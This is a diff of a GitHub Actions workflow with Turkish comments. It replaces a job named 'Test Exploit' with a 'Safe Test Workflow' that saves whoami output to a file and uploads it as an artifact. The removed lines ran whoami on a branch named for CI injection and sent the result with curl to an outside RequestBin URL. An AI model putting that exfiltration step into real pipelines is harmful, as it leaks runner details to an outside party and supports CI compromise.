@@ -1,18 +1,30 @@
-name: Test Exploit
+name: Safe Test Workflow
 
 on:
   push:
     branches:
-      - exploit-ci-injection  # senin branch’in
+      - test-branch   # push yaptığın branch'i yaz
 
 jobs:
-  run-whoami:
+  safe-whoami:
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout
+      - name: Checkout repository
         uses: actions/checkout@v3
 
-      - name: Run whoami and send to RequestBin
+      - name: Run whoami and save to file
         run: |
-          WHO=$(whoami)
-          curl -X POST -d "$WHO" https://requestbin.net/bins/40cb5685-21cb-4a23-b461-bd460d3accca
+          whoami > whoami.txt
+          echo "Saved whoami to whoami.txt"
+
+      - name: Show whoami in job log
+        run: |
+          echo "---- whoami output ----"
+          cat whoami.txt
+          echo "-----------------------"
+
+      - name: Upload whoami output as artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: whoami-output
+          path: whoami.txt
